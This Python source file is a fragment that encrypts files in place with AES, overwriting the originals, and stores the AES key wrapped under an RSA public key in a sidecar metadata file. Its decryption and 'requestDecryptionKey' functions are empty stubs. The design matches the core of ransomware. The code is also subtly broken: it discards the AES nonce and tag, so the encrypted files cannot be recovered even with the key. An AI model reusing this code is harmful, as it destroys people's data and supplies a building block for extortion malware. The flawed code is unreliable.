import os
from Crypto.Cipher import PKCS1_OAEP
from Cryptodome.Cipher import AES
from Cryptodome.PublicKey import RSA
from utils import *
import utils


def encryptFile(filename, symmetric_key):
    cipher = AES.new(symmetric_key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(utils.getFileByteArray(filename))
    with open(filename, 'wb') as f:
        f.write(ciphertext)
    return


def generateSymmKey(bits=16):
    random_key = os.urandom(bits)
    return random_key


def requestDecryptionKey(filename):
    return


def decryptFile(filename, symmetric_key):
    return


def encryptSymmInMetadata(filename, symmetric_key, puk):
    print(puk)
    rsa_cipher = PKCS1_OAEP.new(RSA.importKey(puk))
    data_encrypted = rsa_cipher.encrypt(symmetric_key)
    parts = filename.split("/")
    base = '/'.join(parts[:-1])
    metadataFile = base+"/metadata."+parts[-1]
    print("[ENC] Created metadata file")
    with open(metadataFile, 'wb') as f:
        f.write(data_encrypted)


